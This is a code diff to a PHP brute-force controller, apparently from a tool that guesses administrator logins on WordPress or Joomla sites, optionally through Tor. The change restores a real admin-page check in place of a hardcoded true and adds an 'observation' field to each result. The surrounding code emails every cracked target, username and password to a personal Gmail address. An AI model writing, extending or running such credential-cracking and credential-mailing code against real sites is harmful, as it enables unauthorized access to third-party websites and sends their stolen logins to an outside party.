@@ -252,8 +252,8 @@ class BruteForceController extends Command{
                 $site = new Site($valueTarget);
                 $site->setTor($tor);
                 //$resultIsJoomla=$site->isJoomla();
-                //$resultIsAdmin=$site->isAdmin();
-                $resultIsAdmin=true;
+                $resultIsAdmin=$site->isAdmin();
+                //$resultIsAdmin=true;
                 if($resultIsAdmin)
                 {
                     $usernameField  = $site->getNameFieldUsername();
@@ -270,6 +270,11 @@ class BruteForceController extends Command{
                         $resultFinal[0]['target']=$valueTarget;
                         $resultFinal[0]['username']=$resultOfBruteForce['username'];
                         $resultFinal[0]['password']=$resultOfBruteForce['password'];
+                        if(isset($resultOfBruteForce['obs']))
+                        {
+                            $resultFinal[0]['obs']=$resultOfBruteForce['obs'];
+                        }
+
                         $this->sendMailWordPress($resultFinal);
                     }
                     //
@@ -419,6 +424,9 @@ class BruteForceController extends Command{
                 $msg.= "Target =".$result['target']."<br>";
                 $msg.= "Username =".$result['username']."<br>";
                 $msg.= "Password =".$result['password']."<br>";
+                if(isset($result['obs'])){
+                    $msg.= "Obeservation =".$result['obs']."<br>";
+                }
             }
             $mailer->sendMessage('lenonleite@gmail.com',$msg);
         }
